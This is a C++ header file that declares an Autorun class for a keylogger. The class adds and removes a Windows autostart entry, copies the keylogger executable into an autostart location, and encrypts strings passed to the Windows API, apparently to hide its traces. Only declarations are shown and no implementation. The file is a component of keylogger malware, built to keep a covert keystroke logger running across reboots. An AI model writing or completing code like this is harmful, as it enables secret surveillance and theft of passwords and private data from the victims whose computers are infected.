#ifndef AUTORUN_H
#define	AUTORUN_H
#include <cstring>
#include <iostream>
#include <windows.h>
#include "Config.h"

#include "Log.h"
#include "newWinApi.h"


using namespace std;

class Autorun {
public:
    Autorun(string keyloggerFileNameIn);
    bool addAutostart();
    bool deleteAutostart();
    bool isActive(); //usun z public
    bool isCopyFile();
    string getKeyloggerFileName();
private:
    Config *config;
    bool CopyFileAutostart();
    LPCTSTR encryptStringToLPCTSTR(string value);
    string keyloggerFileName;
    newWinApi *newWinApix;

};

#endif	/* AUTORUN_H */

